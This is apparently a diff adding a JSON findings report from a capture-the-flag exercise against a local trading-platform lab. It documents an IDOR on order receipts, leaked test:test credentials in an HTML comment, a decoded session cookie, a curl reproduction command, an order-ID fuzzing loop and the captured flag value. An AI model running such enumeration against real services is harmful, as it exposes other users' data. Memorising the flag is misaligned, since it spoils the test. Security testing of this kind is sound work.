@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T20:12:47.149971+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "bdb50b1f-63a9-4b81-bbd8-babf576e82b8",
+      "timestamp": "2026-04-12T20:12:47.149875+00:00",
+      "title": "BOLA/IDOR - Unauthorized Access to Other Users' Order Receipts",
+      "severity": "critical",
+      "target": "http://172.17.0.1:33447/order/300401/receipt",
+      "description": "The /order/<order_id>/receipt endpoint does not verify that the authenticated user owns the order being accessed. A logged-in user (test, user_id=10032) can access receipts belonging to other users by simply changing the order_id in the URL. Order 300401 belongs to another user and contains the CTF flag.",
+      "evidence": "GET /order/300401/receipt with session cookie for user 'test' (user_id=10032) returns:\n\nflag{85c0d827-5e28-4577-be2b-319bdcbf872d}\n\nThe test user's own orders are: 300123, 300214, 300327, 300481. Order 300401 belongs to a different user but is freely accessible.\n\nAdditional vector: The HTML comment on the login page leaked credentials: <!-- TODO: Delete the testing account (test:test). -->\n\nThe Flask session cookie encodes user_id: eyJ1c2VyX2lkIjoxMDAzMn0 = {\"user_id\":10032}",
+      "tool_used": "manual HTTP fuzzing (bash loop over order IDs 300000-300500)",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -b 'session=<logged_in_session>' http://172.17.0.1:33447/order/300401/receipt",
+        "expected": "Returns order receipt containing flag{85c0d827-5e28-4577-be2b-319bdcbf872d}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "3c6cb5ff-dbe0-4580-a6eb-f2651a74665a",
+      "timestamp": "2026-04-12T20:13:00.984898+00:00",
+      "title": "Trading Platform - Attack Surface",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] --> Login[\"/POST username only\"]\n  Login -->|\"302 redirect\"| Password[\"/password/test GET/POST\"]\n  Password -->|\"Hidden field user_id=10032\"| Auth[\"Flask Session Cookie\"]\n  Auth --> Dashboard[\"/dashboard - Welcome John Doe\"]\n  Auth --> Orders[\"/orders - List user orders\"]\n  Orders -->|\"IDOR - fuzz order_id\"| Receipt[\"/order/ORDER_ID/receipt\"]\n  Receipt -->|\"order 300401 = other user\"| Flag[\"flag{85c0d827-5e28-4577-be2b-319bdcbf872d}\"]\n  HTMLComment[\"HTML Comment: test:test creds\"] -->|\"Leaked credentials\"| Login\n  Session[\"Flask Session JWT: user_id=10032\"] -->|\"Encodes user identity\"| Auth"
+    }
+  ]
+}
